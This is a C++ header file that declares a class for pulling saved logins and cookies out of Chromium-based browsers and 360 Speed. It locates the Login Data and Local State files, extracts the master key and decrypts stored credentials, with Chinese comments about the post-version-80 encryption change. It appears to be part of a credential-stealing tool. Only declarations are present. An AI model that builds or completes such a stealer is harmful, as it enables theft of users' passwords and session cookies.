#pragma once
#include "UnCode.h"
#include <string.h>


#define BROWSER_SUCCESS					0x00000000
#define BROWSER_UNKNOW_FAILED			0x00000001
#define BROWSER_LOCALAPPDATA_NOT_FIND	0x00000002
#define BROWSER_COPY_LOGIN_DATA_FAILED	0x00000003
#define BROWSER_SQLITE_OPEN_FAILED		0x00000004
#define BROWSER_SQLITE_PREPARE_FAILED	0x00000005
#define BROWSER_LOGIN_DATA_NOT_FIND		0x00000006

#define BROWSER_COOKIES_NOT_FIND		0x00000007
#define BROWSER_COOKIES_DATA_FAILED		0x00000008

// bug 当 db库中同时保存者 80 版本之前 和之后的数据时 会发生解密部分失败

class GetBrowserInfo
{
public:
	GetBrowserInfo(BroType brot);
	~GetBrowserInfo();

	BOOL GetAllData(std::vector<BrowserData> *pBroData);

private:
	DWORD GetData(std::vector<BrowserData> *pBroData);

	// 判断是否80之后版本 解密方式不同
	bool GetMasterKey(DATA_BLOB* pDatab);
	LPCSTR ParseEncryptedKey(LPSTR* buf);
	std::string GetFullPathFromRelativeToBro(LPCSTR relative);

	// 需要获取的文件路径
	std::string m_loginDataPath;
	std::string m_localStatePath;

	BroType m_brot;
	bool m_isOk;
	DWORD m_errCode;

	std::string m_BroDir;
	std::string m_BroName;

	// 360Speed login db
	void Find360SPLoginDB(std::string lpPath);
	std::vector<std::string> logindbver;



	// ==========================================================================
	// 获取cookie 这是新加入的代码
public:

	BOOL GetBrowserInfo::GetAllCookies(std::vector<BrowserCookies> *pBroCookies);

private:
	DWORD GetCookies(std::vector<BrowserCookies> *pBroCookies);

	bool m_isOkCookieChrome;
	std::string m_chromeCookiespath;

};

